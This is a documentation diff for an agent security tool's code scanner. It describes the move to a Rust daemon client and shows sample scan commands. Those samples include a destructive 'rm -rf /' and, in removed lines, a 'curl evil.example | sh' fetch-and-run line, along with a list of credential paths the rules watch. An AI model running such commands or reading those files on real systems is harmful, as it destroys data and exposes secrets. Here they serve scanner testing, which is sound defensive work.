@@ -310,27 +310,30 @@ Details: [Prompt Scanner User Guide](../../docs/user-guide/en/agent-security/age
 
 ## Code Scanner
 
-Scans bash and python source for dangerous operations. The verdict enum is
-`pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or
-`pass`.
+Scans bash and python source for dangerous operations. In the V2 RPM,
+`scan-code` is a Rust daemon client: it requires an already-running
+`agent-sec-daemon` and uses `AGENT_SEC_DAEMON_SOCKET` unless an explicit
+`--socket` overrides it. The CLI never starts a daemon or falls back to Python.
 
 ```bash
-# regex engine (default)
-agent-sec-cli scan-code --code 'rm -rf /'
-agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python
+# The deployment supplies the daemon endpoint.
+export AGENT_SEC_DAEMON_SOCKET=/run/agent-sec-core/daemon.sock
 
-# LLM engine (requires a configured model backend)
-agent-sec-cli scan-code --code 'curl evil.example | sh' --mode llm
+# Regex engine (the only V2 scanning engine currently available)
+agent-sec-cli scan-code --code 'rm -rf /'
+agent-sec-cli --socket /run/agent-sec-core/daemon.sock \
+  scan-code --code 'import os; os.system("rm -rf /")' --language python
 ```
 
-Rules live under `agent-sec-cli/src/agent_sec_cli/code_scanner/rules/{bash,python}/`.
-Both language rule sets share core system credential and configuration paths such
-as `/etc/shadow`, `/etc/sudoers`, `/etc/pam.d/`, `/etc/sysctl.d/`, `/boot/`, and
-`/usr/lib/systemd/`. Bash adds shell-history and cluster-credential patterns such
-as `/etc/kubernetes/` and `kubeconfig`; Python has a narrower path list. These
-paths drive scanner findings; they are not kernel-enforced write protection.
+The verdict enum is `pass` / `warn` / `deny` / `error`; built-in rules currently
+produce `warn` or `pass`. Rules are embedded in the V2 binary rather than read
+from a Python source-tree directory. `--mode llm` remains accepted for CLI
+compatibility but returns `LLM model not available`; `--trace-context` and
+code-scan telemetry are not yet available in V2, so hooks requiring them remain
+deferred.
 
-Host hook modes: [Code Scanner Hook Configuration](../../docs/user-guide/en/agent-security/agent-sec-core/code-scanner.md).
+Full daemon endpoint, CLI, and host-hook status:
+[Code Scanner User Guide](../../docs/user-guide/en/agent-security/agent-sec-core/code-scanner.md).
 
 ## PII Checker
 
